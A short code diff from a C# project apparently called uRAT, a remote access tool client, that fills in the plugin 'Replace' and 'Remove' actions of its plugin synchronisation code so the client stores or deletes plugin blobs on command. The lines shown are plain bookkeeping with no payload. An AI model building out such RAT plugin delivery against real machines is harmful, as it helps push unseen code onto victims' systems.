@@ -56,10 +56,16 @@ namespace uRAT.Client.Plugin.Synchronization
                             });
                             break;
                         case PluginActionPacket.PluginAction.Replace:
-
+                            blobWriter.ReplacePlugin(action.PluginGuid, new BlobClientPlugin
+                            {
+                                Data = action.PluginData,
+                                Hash = action.IntegrityHash,
+                                Size = action.PluginData.Length,
+                                PluginGuid = action.PluginGuid
+                            });
                             break;
                         case PluginActionPacket.PluginAction.Remove:
-
+                            blobWriter.RemovePlugin(action.PluginGuid);
                             break;
                     }
                 }
